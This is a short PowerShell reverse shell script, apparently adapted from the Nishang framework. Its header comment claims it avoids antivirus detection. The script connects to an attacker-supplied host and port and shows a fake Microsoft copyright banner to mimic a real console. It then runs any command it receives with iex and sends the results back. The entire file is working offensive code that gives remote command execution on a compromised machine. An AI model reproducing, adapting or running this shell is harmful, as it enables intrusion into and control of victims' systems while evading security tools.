#Twitter: @TihanyiNorbert  (No AV detecetion 2021 october)
#Based on the original nishang Framework written by @nikhil_mitt.
$c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
$I = $c.GetStream();
[byte[]]$U = 0..(2-shl15)|%{0};
$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
$I.Write($U,0,$U.Length)
$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$I.Write($U,0,$U.Length)
while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
$a = (iex $D 2>&1 | Out-String );
$r  = $a + (pwd).Path + '> ';
$m = ([text.encoding]::ASCII).GetBytes($r);
$I.Write($m,0,$m.Length);
$I.Flush()};
$c.Close()

